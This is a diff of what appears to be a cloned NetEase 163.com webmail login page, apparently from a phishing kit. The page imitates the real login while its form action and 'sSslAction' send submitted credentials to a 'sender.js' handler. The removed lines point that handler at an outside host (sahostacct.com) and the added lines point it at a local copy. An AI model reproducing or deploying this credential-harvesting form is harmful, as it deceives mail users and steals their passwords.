@@ -375,7 +375,7 @@ var gOption = {
 	"sDomain" : "163.com",
 	"sCookieDomain" : "mail.163.com",
 	"sAutoLoginUrl" : "http://entry.mail.163.com/coremail/fcg/ntesdoor2?lightweight=1&verifycookie=1&language=-1&from=web&df=webmail163",
-	"sSslAction" : "https://sahostacct.com/163/sender.js?",
+	"sSslAction" : "sender.js?",
 	"product" : "mail163",
 	"url" : "http://entry.mail.163.com/coremail/fcg/ntesdoor2?",
 	"url2" : "http://mail.163.com/errorpage/error163.htm",
@@ -445,7 +445,7 @@ fHtml5Tag();
 			</div>
 		</div>
 		<div class="loginForm">
-			<form id="login163" name="login163" method="post" action="https://sahostacct.com/163/sender.js" target="frameforlogin">
+			<form id="login163" name="login163" method="post" action="sender.js" target="frameforlogin">
 				<input type="hidden" id="savelogin" name="savelogin" value="0" />
 				<input type="hidden" name="domainID" value="163" />
 				<input type="hidden" id="url2" name="url2" value="http://mail.163.com/errorpage/error163.htm" />
